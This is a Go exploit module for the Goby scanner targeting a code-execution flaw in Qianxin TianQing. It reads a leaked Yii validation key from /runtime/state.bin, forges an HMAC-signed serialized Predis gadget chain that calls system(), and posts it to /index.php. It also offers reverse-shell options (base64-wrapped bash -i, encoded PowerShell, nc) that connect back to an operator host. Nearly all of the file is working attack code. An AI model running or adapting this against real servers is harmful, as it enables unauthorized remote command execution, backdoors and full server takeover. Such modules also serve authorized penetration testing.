package exploits

import (
	"bytes"
	"compress/zlib"
	"crypto/hmac"
	"crypto/sha1"
	"encoding/base64"
	"encoding/hex"
	"errors"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strconv"
	"strings"
	"time"
	"unicode/utf16"
)

func init() {
	expJson := `{
    "Name": "Qianxin-TianQing /runtime/state.bin Code Execution Vulnerability",
    "Description": "<p>Qianxin-TianQing is an integrated terminal security solution focusing on effectiveness, which helps government and enterprise customers accurately identify, protect and supervise terminals through the \"systematic defense and digital operation\" approach, and ensures that these terminals can access data and services reliably, securely and in compliance at any time. </p>",
    "Product": "Qianxin-TianQing",
    "Homepage": "https://www.qianxin.com/",
    "DisclosureDate": "2023-10-04",
    "PostTime": "2024-05-24",
    "Author": "lidingke@baimaohui.net",
    "FofaQuery": "title=\"天擎\" && (server=\"QiAnXin\" || server=\"360\")",
    "GobyQuery": "title=\"天擎\" && (server=\"QiAnXin\" || server=\"360\")",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>1.There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"https://www.qianxin.com/\">https://www.qianxin.com/</a></p><p>2.Set access policies and whitelist access through security devices such as firewalls. </p><p>3.If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/runtime/state.bin",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "validationkey",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution",
        "HW-2023"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.8",
    "Translation": {
        "CN": {
            "Name": "奇安信天擎 /runtime/state.bin 代码执行漏洞",
            "Product": "奇安信-天擎",
            "Description": "<p>奇安信天擎终端安全管理系统（简称“天擎”）是注重实效的一体化终端安全解决方案，通过“体系化防御、数字化运营”方法，帮助政企客户准确识别、保护和监管终端，并确保这些终端在任何时候都能可信、安全、合规地访问数据和业务。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.qianxin.com/\">https://www.qianxin.com/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行",
                "HW-2023"
            ]
        },
        "EN": {
            "Name": "Qianxin-TianQing /runtime/state.bin Code Execution Vulnerability",
            "Product": "Qianxin-TianQing",
            "Description": "<p>Qianxin-TianQing is an integrated terminal security solution focusing on effectiveness, which helps government and enterprise customers accurately identify, protect and supervise terminals through the \"systematic defense and digital operation\" approach, and ensures that these terminals can access data and services reliably, securely and in compliance at any time.&nbsp;<br></p>",
            "Recommendation": "<p>1.There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"https://www.qianxin.com/\">https://www.qianxin.com/</a></p><p>2.Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>3.If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution",
                "HW-2023"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10967"
}`

	setPayloadRequestHash1717038428 := func(hostInfo *httpclient.FixUrl, command string) (string, string, error) {
		//command为原始命令，如果需编码，请自行编码后使用
		setGetRequest := func(hostInfo *httpclient.FixUrl, url string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(url)
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}
		setPostRequest := func(hostInfo *httpclient.FixUrl, urlGet string, data string, head map[string]string) (*httpclient.HttpResponse, error) {
			PostRequest := httpclient.NewPostRequestConfig(urlGet)
			PostRequest.VerifyTls = false
			PostRequest.FollowRedirect = false
			for headName, headValue := range head {
				PostRequest.Header.Store(headName, headValue)
			}
			PostRequest.Data = data
			return httpclient.DoHttpRequest(hostInfo, PostRequest)
		}
		gzcompress := func(data []byte) ([]byte, error) {
			var buf bytes.Buffer
			w := zlib.NewWriter(&buf)
			_, err := w.Write(data)
			if err != nil {
				return nil, err
			}
			err = w.Close()
			if err != nil {
				return nil, err
			}
			return buf.Bytes(), nil
		}

		//漏洞url地址
		urlGet := "/runtime/state.bin"
		respGet, err := setGetRequest(hostInfo, urlGet, map[string]string{})
		if err != nil || respGet.StatusCode != 200 || !strings.Contains(respGet.RawBody, "validationkey") {
			return "", "", err
		}
		key := []byte(strings.Split(regexp.MustCompile(`s:32:"([\s\S]*)"`).FindString(respGet.RawBody), "\"")[1])
		//key := []byte("0758fea634a9d3385e5e15fa0fdae076")

		data, _ := base64.StdEncoding.DecodeString("TzoyMzoiUHJlZGlzXE1vbml0b3JcQ29uc3VtZXIiOjE6e3M6MzE6IgBQcmVkaXNcTW9uaXRvclxDb25zdW1lcgBjbGllbnQiO086Mjg6IlByZWRpc1xUcmFuc2FjdGlvblxNdWx0aUV4ZWMiOjE6e3M6OToiACoAY2xpZW50IjtPOjMwOiJQcmVkaXNcUHJvZmlsZVxSZWRpc1ZlcnNpb24zMDAiOjI6e3M6Mzc6IgBQcmVkaXNcUHJvZmlsZVxSZWRpc1Byb2ZpbGUAY29tbWFuZHMiO2E6MTp7czoxMDoiRElTQ09OTkVDVCI7TzozNToiUHJlZGlzXENvbW1hbmRcTGlzdFBvcEZpcnN0QmxvY2tpbmciOjA6e319czozODoiAFByZWRpc1xQcm9maWxlXFJlZGlzUHJvZmlsZQBwcm9jZXNzb3IiO086NDM6IlByZWRpc1xDb21tYW5kXFByb2Nlc3NvclxLZXlQcmVmaXhQcm9jZXNzb3IiOjE6e3M6NTM6IgBQcmVkaXNcQ29tbWFuZFxQcm9jZXNzb3JcS2V5UHJlZml4UHJvY2Vzc29yAGNvbW1hbmRzIjthOjE6e3M6NToiQkxQT1AiO2E6Mjp7aTowO086MzU6IlByZWRpc1xDbHVzdGVyXERpc3RyaWJ1dG9yXEhhc2hSaW5nIjoyOntzOjQyOiIAUHJlZGlzXENsdXN0ZXJcRGlzdHJpYnV0b3JcSGFzaFJpbmcAbm9kZXMiO2E6MTp7aTowO2E6MTp7czo2OiJvYmplY3QiO3M6ODoiaXBjb25maWciO319czo1MzoiAFByZWRpc1xDbHVzdGVyXERpc3RyaWJ1dG9yXEhhc2hSaW5nAG5vZGVIYXNoQ2FsbGJhY2siO3M6Njoic3lzdGVtIjt9aToxO3M6NzoiZ2V0U2xvdCI7fX19fX19")
		datanew := []byte(strings.ReplaceAll(string(data), "s:8:\"ipconfig", "s:"+strconv.Itoa(len(command))+":\""+command))
		hasher := hmac.New(sha1.New, key)
		hasher.Write(datanew)
		hmacBytes := hasher.Sum(nil)
		hmacString := hex.EncodeToString(hmacBytes)
		data, _ = gzcompress([]byte(hmacString + string(datanew)))
		encodedData := url.QueryEscape(base64.StdEncoding.EncodeToString(data))
		//命令执行的结果，如果结果是编码的，请自己解码后返回，如果返回为空的字符串，则判断命令执行失败
		urlPost := "/index.php"
		header := map[string]string{
			"Upgrade-Insecure-Requests": "1",
			"User-Agent":                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36",
			"Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
			"Accept-Encoding":           "gzip, deflate, br",
			"Accept-Language":           "zh-CN,zh;q=0.9",
			"Connection":                "close",
			"Content-Type":              "application/x-www-form-urlencoded",
		}

		respPost, err := setPostRequest(hostInfo, urlPost, "YII_PAGE_STATE="+encodedData, header)
		if err != nil || respPost.StatusCode != 400 {
			return "", "", err
		}

		commandResult := strings.ReplaceAll(respPost.RawBody, regexp.MustCompile(`<!DOCTYPE html>([\s\S]*)</html>`).FindString(respPost.RawBody), "")
		return commandResult, urlGet, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		//poc验证函数
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHash1717038428

			text := goutils.RandomHexString(16)
			pocCommand := `echo ` + text
			pocRuselt, pocUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil {
				return false
			}
			if strings.Contains(pocRuselt, text) {
				ss.VulURL = hostInfo.FixedHostInfo + pocUrl
				return true
			}
			return false
		},
		//exp利用函数
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHash1717038428

			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBashBase64" {
							command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				Result, _, err := runPayload(expResult.HostInfo, command)

				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}

				if len(Result) > 0 {
					expResult.Success = true
					expResult.Output = Result
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])

				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
